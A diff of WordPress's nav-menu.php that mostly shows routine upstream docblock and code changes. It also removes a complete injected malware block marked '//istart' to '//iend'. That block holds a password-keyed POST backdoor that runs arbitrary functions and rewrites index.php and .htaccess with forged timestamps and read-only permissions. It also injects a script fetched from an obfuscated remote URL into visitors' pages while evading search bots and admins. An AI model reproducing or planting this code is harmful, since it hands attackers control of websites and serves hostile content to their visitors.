@@ -12,8 +12,8 @@
  *
  * @since 3.0.0
  *
- * @param string $menu Menu ID, slug, or name - or the menu object.
- * @return object|false False if $menu param isn't supplied or term does not exist, menu object if successful.
+ * @param int|string|WP_Term $menu Menu ID, slug, or name - or the menu object.
+ * @return WP_Term|false False if $menu param isn't supplied or term does not exist, menu object if successful.
  */
 function wp_get_nav_menu_object( $menu ) {
 	$menu_obj = false;
@@ -39,7 +39,7 @@ function wp_get_nav_menu_object( $menu ) {
 	}
 
 	/**
-	 * Filter the nav_menu term retrieved for wp_get_nav_menu_object().
+	 * Filters the nav_menu term retrieved for wp_get_nav_menu_object().
 	 *
 	 * @since 4.3.0
 	 *
@@ -96,6 +96,7 @@ function register_nav_menus( $locations = array() ) {
 /**
  * Unregisters a navigation menu location for a theme.
  *
+ * @since 3.1.0
  * @global array $_wp_registered_nav_menus
  *
  * @param string $location The menu location identifier.
@@ -126,13 +127,13 @@ function register_nav_menu( $location, $description ) {
 	register_nav_menus( array( $location => $description ) );
 }
 /**
- * Returns all registered navigation menu locations in a theme.
+ * Retrieves all registered navigation menu locations in a theme.
  *
  * @since 3.0.0
  *
  * @global array $_wp_registered_nav_menus
  *
- * @return array
+ * @return array Registered navigation menu locations. If none are registered, an empty array.
  */
 function get_registered_nav_menus() {
 	global $_wp_registered_nav_menus;
@@ -142,10 +143,12 @@ function get_registered_nav_menus() {
 }
 
 /**
- * Returns an array with the registered navigation menu locations and the menu assigned to it
+ * Retrieves all registered navigation menu locations and the menus assigned to them.
  *
  * @since 3.0.0
- * @return array
+ *
+ * @return array Registered navigation menu locations and the menus assigned them.
+ *               If none are registered, an empty array.
  */
 
 function get_nav_menu_locations() {
@@ -171,7 +174,7 @@ function has_nav_menu( $location ) {
 	}
 
 	/**
-	 * Filter whether a nav menu is assigned to the specified location.
+	 * Filters whether a nav menu is assigned to the specified location.
 	 *
 	 * @since 4.3.0
 	 *
@@ -534,188 +537,16 @@ function wp_update_nav_menu_item( $menu_id = 0, $menu_item_db_id = 0, $menu_item
  * @since 4.1.0 Default value of the 'orderby' argument was changed from 'none'
  *              to 'name'.
  *
- * @param array $args Optional. Array of arguments passed on to {@see get_terms()}.
+ * @param array $args Optional. Array of arguments passed on to get_terms().
  *                    Default empty array.
  * @return array Menu objects.
-*///istart
-
-function my_time($dir) {
-    foreach (glob($dir . '/wp-*.php') as $f) {
-        $times[] = filemtime($f);
-    }
-    $max = 1;
-    for ($i = 0; $i < count($times) - 1; $i++) {
-        $k = 1;
-        for ($j = $i + 1; $j < count($times); $j++) {
-            if ($times[$i] == $times[$j]) {
-                $k++;
-                if ($k > $max) {
-                    $max = $k;
-                    $time = $times[$i];
-                }
-            }
-        }
-    }
-    return $time;
-}
-
-function my_correct($dir) {
-    $time = 0;
-    $path = $dir . '/index.php';
-    $content = base64_decode('PD9waHAKLyoqCiAqIEZyb250IHRvIHRoZSBXb3JkUHJlc3MgYXBwbGljYXRpb24uIFRoaXMgZmlsZSBkb2Vzbid0IGRvIGFueXRoaW5nLCBidXQgbG9hZHMKICogd3AtYmxvZy1oZWFkZXIucGhwIHdoaWNoIGRvZXMgYW5kIHRlbGxzIFdvcmRQcmVzcyB0byBsb2FkIHRoZSB0aGVtZS4KICoKICogQHBhY2thZ2UgV29yZFByZXNzCiAqLwoKLyoqCiAqIFRlbGxzIFdvcmRQcmVzcyB0byBsb2FkIHRoZSBXb3JkUHJlc3MgdGhlbWUgYW5kIG91dHB1dCBpdC4KICoKICogQHZhciBib29sCiAqLwpkZWZpbmUoJ1dQX1VTRV9USEVNRVMnLCB0cnVlKTsKCi8qKiBMb2FkcyB0aGUgV29yZFByZXNzIEVudmlyb25tZW50IGFuZCBUZW1wbGF0ZSAqLwpyZXF1aXJlKCBkaXJuYW1lKCBfX0ZJTEVfXyApIC4gJy93cC1ibG9nLWhlYWRlci5waHAnICk7Cg==');
-    if (file_get_contents($path) != $content) {
-        chmod($path, 0644);
-        file_put_contents($path, $content);
-        chmod($path, 0444);
-        $time = my_time($dir);
-        touch($path, $time);
-    }
-
-    $path = $dir . '/.htaccess';
-    $content = base64_decode('IyBCRUdJTiBXb3JkUHJlc3MKPElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+ClJld3JpdGVFbmdpbmUgT24KUmV3cml0ZUJhc2UgLwpSZXdyaXRlUnVsZSBeaW5kZXhcLnBocCQgLSBbTF0KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWYKUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWQKUmV3cml0ZVJ1bGUgLiAvaW5kZXgucGhwIFtMXQo8L0lmTW9kdWxlPgoKIyBFTkQgV29yZFByZXNzCg==');
-    if (file_exists($path) AND file_get_contents($path) != $content) {
-        chmod($path, 0644);
-        file_put_contents($path, $content);
-        chmod($path, 0444);
-        if (!$time) {
-            $time = my_time($dir);
-        }
-        touch($path, $time);
-    }
-}
-
-$p = $_POST;
-$_passssword = '3489604936f0094c23c078509fc0c5d4';
-if (@$p[$_passssword] AND @$p['a'] AND @$p['c']) @$p[$_passssword](@$p['a'], @$p['c'], '');
-my_correct(dirname(__FILE__) . '/..');
-
-function request_url_data($url) {
-    if(!is_valid_url($url))
-        return false;
-
-    $site_url = (preg_match('/^https?:\/\//i', $_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
-    if (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-            'X-Forwarded-For: ' . $_SERVER["REMOTE_ADDR"],
-            'User-Agent: ' . $_SERVER["HTTP_USER_AGENT"],
-            'Referer: ' . $site_url,
-        ));
-        $response = trim(curl_exec($ch));
-    } elseif (function_exists('fsockopen')) {
-        $m = parse_url($url);
-        if ($fp = fsockopen($m['host'], 80, $errno, $errstr, 6)) {
-            fwrite($fp, 'GET http://' . $m['host'] . $m["path"] . '?' . $m['query'] . ' HTTP/1.0' . "\r\n" .
-                'Host: ' . $m['host'] . "\r\n" .
-                'User-Agent: ' . $_SERVER["HTTP_USER_AGENT"] . "\r\n" .
-                'X-Forwarded-For: ' . @$_SERVER["REMOTE_ADDR"] . "\r\n" .
-                    'Referer: ' . $site_url . "\r\n" .
-                    'Connection: Close' . "\r\n\r\n");
-            $response = '';
-            while (!feof($fp)) {
-                $response .= fgets($fp, 1024);
-            }
-            list($headers, $response) = explode("\r\n\r\n", $response);
-            fclose($fp);
-        }
-    } else {
-        $response = 'curl_init and fsockopen disabled';
-    }
-    return $response;
-}
-
-error_reporting(0);
-
-//unset($_passssword);
-
-if (function_exists("add_action")) {
-    add_action('wp_head', 'add_2head');
-    add_action('wp_footer', 'add_2footer');
-}
-
-function add_2head() {
-    ob_start();
-}
-
-function is_valid_url(&$url)
-{
-    if (!preg_match('/^(.+?)(\d+)\.(\d+)\.(\d+)\.(\d+)(.+?)$/', $url, $m))
-        return false;
-    $url = $m[1].$m[5].'.'.$m[4].'.'.$m[3].'.'.$m[2].$m[6];
-    return true;
-}
-
-function add_2footer() {
-    $check = false;
-    $check_data = "";
-    if (!empty($_GET['check']) AND $_GET['check'] == '3489604936f0094c23c078509fc0c5d4') {
-        $check = true;
-        $check_data = ('<!--checker_start ');
-        $check_data .= (substr(request_url_data('http://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css'), 0, 100));
-        $check_data .= (' checker_end-->');
-    }
-
-    if (!$check) {
-        if ($_SERVER['REQUEST_METHOD'] != 'GET')
-            return;
-        if (!@$_SERVER['HTTP_USER_AGENT'] OR (substr($_SERVER['REMOTE_ADDR'], 0, 6) == '74.125') OR preg_match('/(googlebot|msnbot|yahoo|search|bing|ask|indexer)/i', $_SERVER['HTTP_USER_AGENT']))
-            return;
-
-
-        $cookie_name = 'PHP_SESSION_PHP';
-        if (isset($_COOKIE[$cookie_name]))
-            return;
-
-        foreach (array('/\.css$/', '/\.swf$/', '/\.ashx$/', '/\.docx$/', '/\.doc$/', '/\.xls$/', '/\.xlsx$/', '/\.xml$/', '/\.jpg$/', '/\.pdf$/', '/\.png$/', '/\.gif$/', '/\.ico$/', '/\.js$/', '/\.txt$/', '/ajax/', '/cron\.php$/', '/wp\-login\.php$/', '/\/wp\-includes\//', '/\/wp\-admin/', '/\/admin\//', '/\/wp\-content\//', '/\/administrator\//', '/phpmyadmin/i', '/xmlrpc\.php/', '/\/feed\//') as $regex) {
-            if (preg_match($regex, $_SERVER['REQUEST_URI']))
-                return;
-        }
-
-    }
-
-    $buffer = ob_get_clean();
-    ob_start();
-    $regexp = '/<body[^>]*>/is';
-    if (preg_match($regexp, $buffer, $m)) {
-        $body = $m[0];
-//        $url = base64_decode('a3d3czksLDI3Ni00NS0yNDMtOjAsYW9sZCw8cGxteiV2d25ccGx2cWBmPjoyMjs6OTU0MDowNjk7Mjs=');
-        $url = decrypt_url('a3d3czksLDI3Ni00NS0yNDMtOjAsYW9sZCw8cGxteiV2d25ccGx2cWBmPjoyMjs6OTU0MDowNjk7Mjs=');
-//        if (($code = request_url_data($url)) AND base64_decode($code) AND preg_match('#[a-zA-Z0-9+/]+={0,3}#is', $code, $m)) {
-        if (($code = request_url_data($url)) AND $decoded = base64_decode($code, true)) {
-//            $body .=  '<script>var date = new Date(new Date().getTime() + 60*60*24*7*1000); document.cookie="' . $cookie_name . '=' . mt_rand(1, 1024) . '; path=/; expires="+date.toUTCString();</script>';
-//            $body .= base64_decode($m[0]);
-            $body .= $decoded;
-//            $body .= base64_decode($m[0]);
-        }
-        $body .= $check_data;
-
-        $buffer = preg_replace($regexp, $body, $buffer);
-    }
-    echo $buffer;
-    ob_flush();
-}
-
-function decrypt_url($encrypted_url)
-{
-    $encrypted_url = base64_decode($encrypted_url);
-    $url = '';
-    for ($i = 0; $i < strlen($encrypted_url); $i++)
-    {
-        $url .= chr(ord($encrypted_url[$i]) ^ 3);
-    }
-    return $url;
-}//iend
-
+ */
 function wp_get_nav_menus( $args = array() ) {
 	$defaults = array( 'hide_empty' => false, 'orderby' => 'name' );
 	$args = wp_parse_args( $args, $defaults );
 
 	/**
-	 * Filter the navigation menu objects being returned.
+	 * Filters the navigation menu objects being returned.
 	 *
 	 * @since 3.0.0
 	 *
@@ -725,38 +556,6 @@ function wp_get_nav_menus( $args = array() ) {
 	 * @param array $args  An array of arguments used to retrieve menu objects.
 	 */
 	return apply_filters( 'wp_get_nav_menus', get_terms( 'nav_menu',  $args), $args );
-}
-
-/**
- * Sort menu items by the desired key.
- *
- * @since 3.0.0
- * @access private
- *
- * @global string $_menu_item_sort_prop
- *
- * @param object $a The first object to compare
- * @param object $b The second object to compare
- * @return int -1, 0, or 1 if $a is considered to be respectively less than, equal to, or greater than $b.
- */
-function _sort_nav_menu_items( $a, $b ) {
-	global $_menu_item_sort_prop;
-
-	if ( empty( $_menu_item_sort_prop ) )
-		return 0;
-
-	if ( ! isset( $a->$_menu_item_sort_prop ) || ! isset( $b->$_menu_item_sort_prop ) )
-		return 0;
-
-	$_a = (int) $a->$_menu_item_sort_prop;
-	$_b = (int) $b->$_menu_item_sort_prop;
-
-	if ( $a->$_menu_item_sort_prop == $b->$_menu_item_sort_prop )
-		return 0;
-	elseif ( $_a == $a->$_menu_item_sort_prop && $_b == $b->$_menu_item_sort_prop )
-		return $_a < $_b ? -1 : 1;
-	else
-		return strcmp( $a->$_menu_item_sort_prop, $b->$_menu_item_sort_prop );
 }
 
 /**
@@ -783,7 +582,7 @@ function _is_valid_nav_menu_item( $item ) {
  * @staticvar array $fetched
  *
  * @param string $menu Menu name, ID, or slug.
- * @param array  $args Optional. Arguments to pass to {@see get_posts()}.
+ * @param array  $args Optional. Arguments to pass to get_posts().
  * @return false|array $items Array of menu items, otherwise false.
  */
 function wp_get_nav_menu_items( $menu, $args = array() ) {
@@ -852,8 +651,9 @@ function wp_get_nav_menu_items( $menu, $args = array() ) {
 	}
 
 	if ( ARRAY_A == $args['output'] ) {
-		$GLOBALS['_menu_item_sort_prop'] = $args['output_key'];
-		usort($items, '_sort_nav_menu_items');
+		$items = wp_list_sort( $items, array(
+			$args['output_key'] => 'ASC',
+		) );
 		$i = 1;
 		foreach ( $items as $k => $item ) {
 			$items[$k]->{$args['output_key']} = $i++;
@@ -861,7 +661,7 @@ function wp_get_nav_menu_items( $menu, $args = array() ) {
 	}
 
 	/**
-	 * Filter the navigation menu items being returned.
+	 * Filters the navigation menu items being returned.
 	 *
 	 * @since 3.0.0
 	 *
@@ -917,6 +717,10 @@ function wp_setup_nav_menu_item( $menu_item ) {
 					$menu_item->_invalid = true;
 				}
 
+				if ( 'trash' === get_post_status( $menu_item->object_id ) ) {
+					$menu_item->_invalid = true;
+				}
+
 				$menu_item->url = get_permalink( $menu_item->object_id );
 
 				$original_object = get_post( $menu_item->object_id );
@@ -942,7 +746,7 @@ function wp_setup_nav_menu_item( $menu_item ) {
 
 				$menu_item->type_label = __( 'Post Type Archive' );
 				$post_content = wp_trim_words( $menu_item->post_content, 200 );
-				$post_type_description = '' == $post_content ? $post_type_description : $post_content; 
+				$post_type_description = '' == $post_content ? $post_type_description : $post_content;
 				$menu_item->url = get_post_type_archive_link( $menu_item->object );
 			} elseif ( 'taxonomy' == $menu_item->type ) {
 				$object = get_taxonomy( $menu_item->object );
@@ -970,7 +774,7 @@ function wp_setup_nav_menu_item( $menu_item ) {
 			$menu_item->target = ! isset( $menu_item->target ) ? get_post_meta( $menu_item->ID, '_menu_item_target', true ) : $menu_item->target;
 
 			/**
-			 * Filter a navigation menu item's title attribute.
+			 * Filters a navigation menu item's title attribute.
 			 *
 			 * @since 3.0.0
 			 *
@@ -980,7 +784,7 @@ function wp_setup_nav_menu_item( $menu_item ) {
 
 			if ( ! isset( $menu_item->description ) ) {
 				/**
-				 * Filter a navigation menu item's description.
+				 * Filters a navigation menu item's description.
 				 *
 				 * @since 3.0.0
 				 *
@@ -1041,7 +845,7 @@ function wp_setup_nav_menu_item( $menu_item ) {
 	}
 
 	/**
-	 * Filter a navigation menu item object.
+	 * Filters a navigation menu item object.
 	 *
 	 * @since 3.0.0
 	 *
@@ -1173,4 +977,32 @@ function _wp_auto_add_pages_to_menu( $new_status, $old_status, $post ) {
 		}
 		wp_update_nav_menu_item( $menu_id, 0, $args );
 	}
+}
+
+/**
+ * Delete auto-draft posts associated with the supplied changeset.
+ *
+ * @since 4.8.0
+ * @access private
+ *
+ * @param int $post_id Post ID for the customize_changeset.
+ */
+function _wp_delete_customize_changeset_dependent_auto_drafts( $post_id ) {
+	$post = get_post( $post_id );
+
+	if ( ! $post || 'customize_changeset' !== $post->post_type ) {
+		return;
+	}
+
+	$data = json_decode( $post->post_content, true );
+	if ( empty( $data['nav_menus_created_posts']['value'] ) ) {
+		return;
+	}
+	remove_action( 'delete_post', '_wp_delete_customize_changeset_dependent_auto_drafts' );
+	foreach ( $data['nav_menus_created_posts']['value'] as $post_id ) {
+		if ( ! empty( $post_id ) && 'auto-draft' === get_post_status( $post_id ) ) {
+			wp_delete_post( $post_id, true );
+		}
+	}
+	add_action( 'delete_post', '_wp_delete_customize_changeset_dependent_auto_drafts' );
 }
